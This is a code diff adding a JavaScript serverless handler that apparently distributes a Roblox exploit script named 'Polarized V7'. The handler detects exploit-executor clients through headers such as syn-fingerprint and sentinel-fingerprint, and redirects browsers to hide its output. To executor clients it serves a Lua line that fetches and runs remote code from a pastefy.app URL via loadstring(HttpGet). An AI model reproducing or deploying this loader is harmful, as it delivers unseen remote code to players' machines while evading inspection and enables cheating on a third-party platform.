@@ -1,0 +1,24 @@
+export default function handler(req, res) {
+    const userAgent = req.headers['user-agent'] || '';
+    
+    // Check for common Roblox Executor indicators
+    const isExecutor = 
+        userAgent.includes('Roblox') || 
+        req.headers['x-executor'] || 
+        req.headers['syn-fingerprint'] ||
+        req.headers['sentinel-fingerprint'];
+
+    if (!isExecutor) {
+        // Redirect browser users back to the homepage if they try to visit the API directly
+        return res.redirect(301, '/');
+    }
+
+    // Your Lua Script
+    const luaScript = `
+        print("Polarized V7 | Authenticated")
+        loadstring(game:HttpGet("https://pastefy.app/02YmDjW1/raw"))()
+    `;
+
+    res.setHeader('Content-Type', 'text/plain');
+    return res.status(200).send(luaScript);
+}
